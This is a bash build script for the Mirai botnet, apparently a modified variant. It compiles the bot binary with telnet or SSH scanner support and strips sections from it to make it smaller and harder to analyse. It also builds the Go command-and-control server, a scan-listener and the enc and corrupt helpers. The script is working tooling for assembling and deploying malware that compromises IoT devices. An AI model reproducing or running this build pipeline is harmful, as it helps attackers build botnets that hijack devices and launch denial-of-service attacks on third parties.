#!/bin/bash

FLAGS=""

function compile_bot {
    echo "  Compiling bot for $1 -> release/$2"
    gcc -m32 -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    if [ $? -eq 0 ]; then
        echo "    [OK] Compiled $2"
        strip release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null
    else
        echo "    [FAIL] Failed to compile $2"
    fi
}

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    echo ""
    echo "Examples:"
    echo "  $0 release telnet   - Build release version with telnet scanner"
    echo "  $0 debug telnet     - Build debug version with telnet scanner"
    exit 1
fi

# Set build type flags
if [ "$2" == "telnet" ]; then
    FLAGS="-DMIRAI_TELNET"
    echo "Building with TELNET scanner support"
elif [ "$2" == "ssh" ]; then
    FLAGS="-DMIRAI_SSH"
    echo "Building with SSH support"
else
    echo "Unknown build type: $2"
    exit 1
fi

# Install 32-bit development libraries if needed
if [ ! -f /usr/lib/i386-linux-gnu/libc.so ]; then
    echo "Installing 32-bit development libraries..."
    sudo apt update
    sudo apt install -y gcc-multilib
fi

# Create release directory
mkdir -p release

if [ "$1" == "release" ]; then
    echo ""
    echo "=== Building RELEASE version (x86-32 only) ==="
    
    # Clean old binaries
    rm -f release/mirai.* release/miraint.* release/cnc release/scanListen
    
    # Build CNC (Go)
    echo ""
    echo "[1/4] Building CNC (Go)..."
    cd cnc
    go build -o ../release/cnc main.go
    if [ $? -eq 0 ]; then
        echo "  [OK] CNC built: release/cnc"
    else
        echo "  [FAIL] CNC build failed"
        exit 1
    fi
    cd ..
    
    # Build bot binary
    echo ""
    echo "[2/4] Building bot binary..."
    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    
    # Build bot without scanner (optional)
    echo ""
    echo "[3/4] Building bot (no scanner)..."
    compile_bot i586 miraint.x86 "-static"
    
    # Build scanListen tool
    echo ""
    echo "[4/4] Building scanListen..."
    go build -o release/scanListen tools/scanListen.go
    if [ $? -eq 0 ]; then
        echo "  [OK] scanListen built: release/scanListen"
    else
        echo "  [FAIL] scanListen build failed"
    fi
    
    echo ""
    echo "=== Release build complete ==="
    echo ""
    ls -lh release/
    
elif [ "$1" == "debug" ]; then
    echo ""
    echo "=== Building DEBUG version (x86-32 only) ==="
    
    # Clean old binaries
    rm -f debug/mirai.dbg debug/cnc debug/enc debug/corrupt debug/scanListen
    
    # Create debug directory
    mkdir -p debug
    
    # Build debug bot
    echo ""
    echo "[1/5] Building debug bot..."
    gcc -m32 -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
    if [ $? -eq 0 ]; then
        echo "  [OK] Debug bot built: debug/mirai.dbg"
    else
        echo "  [FAIL] Debug bot build failed"
    fi
    
    # Build debug tools
    echo ""
    echo "[2/5] Building enc tool..."
    gcc -m32 -std=c99 tools/enc.c -g -o debug/enc
    if [ $? -eq 0 ]; then
        echo "  [OK] enc built: debug/enc"
    fi
    
    echo ""
    echo "[3/5] Building corrupt tool..."
    gcc -m32 -std=c99 tools/corrupt.c -g -o debug/corrupt
    if [ $? -eq 0 ]; then
        echo "  [OK] corrupt built: debug/corrupt"
    fi
    
    # Build debug CNC
    echo ""
    echo "[4/5] Building debug CNC..."
    cd cnc
    go build -o ../debug/cnc main.go
    cd ..
    if [ $? -eq 0 ]; then
        echo "  [OK] Debug CNC built: debug/cnc"
    else
        echo "  [FAIL] Debug CNC build failed"
    fi
    
    # Build debug scanListen
    echo ""
    echo "[5/5] Building debug scanListen..."
    go build -o debug/scanListen tools/scanListen.go
    if [ $? -eq 0 ]; then
        echo "  [OK] scanListen built: debug/scanListen"
    fi
    
    echo ""
    echo "=== Debug build complete ==="
    echo ""
    ls -lh debug/
    
else
    echo "Unknown parameter: $1"
    echo "Usage: $0 <debug | release> <telnet | ssh>"
    exit 1
fi

echo ""
echo "Done!"